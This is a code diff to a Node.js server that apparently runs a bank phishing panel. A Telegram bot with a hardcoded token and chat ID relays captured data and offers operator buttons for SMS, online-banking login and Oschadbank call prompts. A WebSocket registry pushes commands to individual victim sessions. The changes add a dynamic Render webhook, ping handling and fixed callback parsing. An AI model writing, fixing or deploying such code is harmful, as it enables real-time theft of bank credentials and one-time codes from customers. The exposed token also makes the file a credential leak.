@@ -7,7 +7,10 @@ const path = require('path');
 // НАСТРОЙКИ
 const TELEGRAM_BOT_TOKEN = '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
 const CHAT_ID = '-4970332008';
-const WEBHOOK_URL = 'https://new-l8h6.onrender.com/bot' + TELEGRAM_BOT_TOKEN;
+
+// Динамический webhook для Render
+const hostname = process.env.RENDER_EXTERNAL_HOSTNAME || `localhost:${process.env.PORT || 3000}`;
+const WEBHOOK_URL = `https://${hostname}/bot${TELEGRAM_BOT_TOKEN}`;
 
 // СПИСОК БАНКОВ ДЛЯ КНОПКИ "ЗАПРОС"
 const banksForRequestButton = [
@@ -35,7 +38,7 @@ app.get('/panel', (req, res) => {
 
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
-// Установка webhook
+// Установка webhook динамически
 bot.setWebHook(WEBHOOK_URL).then(() => {
     console.log(`Webhook set to ${WEBHOOK_URL}`);
 }).catch(err => {
@@ -49,7 +52,7 @@ bot.sendMessage(CHAT_ID, 'ПРОЕКТ УСПЕШНО СТАЛ НА СЕРВЕР
 bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));
 
 // Webhook для Telegram
-app.post('/bot' + TELEGRAM_BOT_TOKEN, (req, res) => {
+app.post(`/bot${TELEGRAM_BOT_TOKEN}`, (req, res) => {
     bot.processUpdate(req.body);
     res.sendStatus(200);
 });
@@ -68,10 +71,15 @@ wss.on('connection', (ws) => {
     console.log('Client connected');
     ws.on('message', (message) => {
         try {
-            const data = JSON.parse(message);
-            if (data.type === 'register' && data.sessionId) {
-                clients.set(data.sessionId, ws);
-                console.log(`Client registered: ${data.sessionId}`);
+            const data = message.toString();
+            if (data === 'ping') {
+                ws.send('pong');
+                return;
+            }
+            const parsed = JSON.parse(data);
+            if (parsed.type === 'register' && parsed.sessionId) {
+                clients.set(parsed.sessionId, ws);
+                console.log(`Client registered: ${parsed.sessionId}`);
             }
         } catch (e) {
             console.error('Error processing message:', e);
@@ -198,7 +206,7 @@ function sendToTelegram(message, sessionId, bankName) {
     let keyboard = [
         [
             { text: 'SMS', callback_data: `sms:${sessionId}` },
-            { text: 'ЛК', callback_data: `lk_${bankName.toLowerCase().replace(/ /g, '_')}::${sessionId}` },
+            { text: 'ЛК', callback_data: `lk_${bankName.toLowerCase().replace(/ /g, '_')}:${sessionId}` },
             { text: 'ЗВОНОК', callback_data: `call_oschad:${sessionId}` }
         ],
         [
@@ -235,8 +243,10 @@ function sendToTelegram(message, sessionId, bankName) {
 }
 
 bot.on('callback_query', (callbackQuery) => {
-    const [type, param] = callbackQuery.data.split(':');
-    const sessionId = param || type.split(':')[1]; // Фикс для lk_*::
+    const parts = callbackQuery.data.split(':');
+    const type = parts[0];
+    const sessionId = parts[1];
+    console.log(`Callback: type=${type}, sessionId=${sessionId}`); // Debug
     const ws = clients.get(sessionId);
     if (ws && ws.readyState === WebSocket.OPEN) {
         let commandData = {};
